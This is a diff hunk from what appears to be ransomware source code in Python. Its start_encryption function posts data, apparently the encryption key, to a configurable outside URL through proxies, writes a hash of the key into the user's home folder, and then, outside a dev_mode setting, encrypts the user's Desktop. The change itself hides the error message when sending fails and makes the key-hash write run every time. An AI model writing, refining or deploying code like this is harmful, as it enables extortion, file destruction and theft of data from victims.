@@ -376,11 +376,12 @@ def start_encryption():
         try:
             requests.post(YOUR_URL, data=data, proxies=proxies, timeout=30)
         except requests.exceptions.RequestException as e:
-            print(f"Error sending data: {e}")
-            with open(
-                os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb"
-            ) as f:
-                f.write(hashlib.sha256(bytes(key)).hexdigest().encode())
+            # print(f"Error sending data: {e}")
+            pass
+        with open(
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb"
+        ) as f:
+            f.write(hashlib.sha256(bytes(key)).hexdigest().encode())
         if not dev_mode:
             encrypt_directory(
                 os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), bytes(key)
